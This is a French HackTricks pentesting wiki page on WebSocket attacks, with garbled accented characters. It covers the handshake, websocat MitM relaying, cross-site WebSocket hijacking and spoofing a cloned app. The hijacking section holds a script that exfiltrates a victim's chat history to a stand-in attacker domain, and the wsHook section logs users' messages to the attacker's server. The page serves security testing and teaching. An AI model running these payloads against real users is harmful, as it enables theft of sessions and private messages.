# Attaques WebSocket

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Qu'est-ce que WebSockets

Les connexions WebSocket sont √©tablies via un **poign√©e de main HTTP** initial et sont con√ßues pour √™tre **durables**, permettant une messagerie bidirectionnelle √† tout moment sans avoir besoin d'un syst√®me transactionnel. Cela rend les WebSockets particuli√®rement avantageux pour les applications n√©cessitant une **faible latence ou une communication initi√©e par le serveur**, telles que les flux de donn√©es financi√®res en direct.

### √âtablissement de connexions WebSocket

Une explication d√©taill√©e sur l'√©tablissement de connexions WebSocket peut √™tre consult√©e [**ici**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). En r√©sum√©, les connexions WebSocket sont g√©n√©ralement initi√©es via JavaScript c√¥t√© client comme indiqu√© ci-dessous:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Le protocole `wss` signifie une connexion WebSocket s√©curis√©e avec **TLS**, tandis que `ws` indique une connexion **non s√©curis√©e**.

Pendant l'√©tablissement de la connexion, une poign√©e de main est effectu√©e entre le navigateur et le serveur via HTTP. Le processus de poign√©e de main implique que le navigateur envoie une demande et que le serveur r√©ponde, comme illustr√© dans les exemples suivants :

Le navigateur envoie une demande de poign√©e de main :
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
R√©ponse de poign√©e de main du serveur:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La connexion reste ouverte pour l'√©change de messages dans les deux sens une fois √©tablie.

**Points cl√©s de la poign√©e de main WebSocket :**

- Les en-t√™tes `Connection` et `Upgrade` signalent le d√©but d'une poign√©e de main WebSocket.
- L'en-t√™te `Sec-WebSocket-Version` indique la version du protocole WebSocket souhait√©e, g√©n√©ralement `13`.
- Une valeur al√©atoire encod√©e en Base64 est envoy√©e dans l'en-t√™te `Sec-WebSocket-Key`, garantissant que chaque poign√©e de main est unique, ce qui aide √† pr√©venir les probl√®mes avec les proxies de mise en cache. Cette valeur n'est pas destin√©e √† l'authentification mais √† confirmer que la r√©ponse n'est pas g√©n√©r√©e par un serveur ou une cache mal configur√©(e).
- L'en-t√™te `Sec-WebSocket-Accept` dans la r√©ponse du serveur est un hachage de `Sec-WebSocket-Key`, v√©rifiant l'intention du serveur d'ouvrir une connexion WebSocket.

Ces fonctionnalit√©s garantissent que le processus de poign√©e de main est s√©curis√© et fiable, ouvrant la voie √† une communication en temps r√©el efficace.


### Console Linux

Vous pouvez utiliser `websocat` pour √©tablir une connexion brute avec un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou pour cr√©er un serveur websocat :
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### Attaques de MitM sur les connexions websocket

Si vous constatez que des clients sont connect√©s √† un **websocket HTTP** depuis votre r√©seau local actuel, vous pourriez essayer une [Attaque de Spoofing ARP](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) pour effectuer une attaque de MitM entre le client et le serveur.\
Une fois que le client tente de se connecter √† vous, vous pouvez alors utiliser :
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### √ânum√©ration des Websockets

Vous pouvez utiliser l'**outil** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **pour d√©couvrir, identifier et rechercher automatiquement des** **vuln√©rabilit√©s** connues dans les websockets.

### Outils de d√©bogage Websocket

* **Burp Suite** prend en charge la communication MitM des websockets de mani√®re tr√®s similaire √† celle des communications HTTP classiques.
* L'extension [**socketsleuth**](https://github.com/snyk/socketsleuth) **pour Burp Suite** vous permettra de mieux g√©rer les communications Websocket dans Burp en obtenant l'**historique**, en d√©finissant des **r√®gles d'interception**, en utilisant des r√®gles de **correspondance et de remplacement**, en utilisant **Intruder** et **AutoRepeater**.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abr√©viation de "**WebSocket/Socket.io Proxy**", cet outil, √©crit en Node.js, fournit une interface utilisateur pour **capturer, intercepter, envoyer des messages personnalis√©s** et visualiser toutes les communications WebSocket et Socket.IO entre le client et le serveur.
* [**wsrepl**](https://github.com/doyensec/wsrepl) est un **REPL websocket interactif** con√ßu sp√©cifiquement pour les tests de p√©n√©tration. Il fournit une interface pour observer les **messages websocket entrants et en envoyer de nouveaux**, avec un framework facile √† utiliser pour **automatiser** cette communication.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) est un **site web pour communiquer** avec d'autres sites web en utilisant des **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) entre autres types de communications/protocoles, fournit un **site web pour communiquer** avec d'autres sites web en utilisant des **websockets**.

## Laboratoire Websocket

Dans [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) vous avez un code pour lancer un site web utilisant des websockets et dans [**cet article**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) vous pouvez trouver une explication.

## D√©tournement de WebSocket inter-sites (CSWSH)

Le **d√©tournement de WebSocket inter-sites**, √©galement connu sous le nom de **d√©tournement de WebSocket inter-origines**, est identifi√© comme un cas sp√©cifique de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** affectant les poign√©es de main WebSocket. Cette vuln√©rabilit√© survient lorsque les poign√©es de main WebSocket s'authentifient uniquement via les **cookies HTTP** sans **jetons CSRF** ou des mesures de s√©curit√© similaires.

Les attaquants peuvent exploiter cela en h√©bergeant une **page web malveillante** qui initie une connexion WebSocket inter-sites √† une application vuln√©rable. Par cons√©quent, cette connexion est trait√©e comme faisant partie de la session de la victime avec l'application, exploitant l'absence de protection CSRF dans le m√©canisme de gestion de session.

### Attaque Simple

Notez que lors de l'**√©tablissement** d'une connexion **websocket**, le **cookie** est **envoy√©** au serveur. Le **serveur** pourrait l'utiliser pour **relier** chaque **utilisateur sp√©cifique** √† sa **session websocket bas√©e sur le cookie envoy√©**.

Ainsi, si par **exemple** le **serveur websocket** **renvoie l'historique de la conversation** d'un utilisateur si un message avec "**READY"** est envoy√©, alors un **simple XSS** √©tablissant la connexion (le **cookie** sera **envoy√© automatiquement** pour autoriser l'utilisateur victime) **envoyant** "**READY**" pourra **r√©cup√©rer** l'historique de la **conversation**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

Dans ce billet de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), l'attaquant a r√©ussi √† **ex√©cuter du code JavaScript arbitraire dans un sous-domaine** du domaine o√π la communication websocket avait lieu. √âtant donn√© qu'il s'agissait d'un **sous-domaine**, le **cookie** √©tait **envoy√©**, et comme le **Websocket ne v√©rifiait pas correctement l'Origine**, il √©tait possible de communiquer avec lui et de **voler des jetons √† partir de l√†**.

### Vol de donn√©es utilisateur

Copiez l'application web que vous souhaitez usurper (les fichiers .html par exemple) et √† l'int√©rieur du script o√π la communication websocket a lieu, ajoutez ce code:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Maintenant, t√©l√©chargez le fichier `wsHook.js` depuis [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) et **enregistrez-le √† l'int√©rieur du dossier contenant les fichiers web**.\
Exposer l'application web et faire en sorte qu'un utilisateur s'y connecte vous permettra de voler les messages envoy√©s et re√ßus via websocket:
```javascript
sudo python3 -m http.server 80
```
## Conditions de course

Les conditions de course dans les WebSockets sont √©galement une chose, [consultez ces informations pour en savoir plus](race-condition.md#rc-in-websockets).

## Autres vuln√©rabilit√©s

Comme les WebSockets sont un m√©canisme pour **envoyer des donn√©es c√¥t√© serveur et c√¥t√© client**, en fonction de la mani√®re dont le serveur et le client g√®rent les informations, **les WebSockets peuvent √™tre utilis√©s pour exploiter plusieurs autres vuln√©rabilit√©s telles que XSS, SQLi ou toute autre vuln√©rabilit√© web commune en utilisant l'entr√©e d'un utilisateur √† partir d'un websocket.**

## **Smuggling WebSocket**

Cette vuln√©rabilit√© pourrait vous permettre de **contourner les restrictions des proxies inverses** en leur faisant croire qu'une **communication websocket a √©t√© √©tablie** (m√™me si ce n'est pas vrai). Cela pourrait permettre √† un attaquant d'**acc√©der √† des points de terminaison cach√©s**. Pour plus d'informations, consultez la page suivante :

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
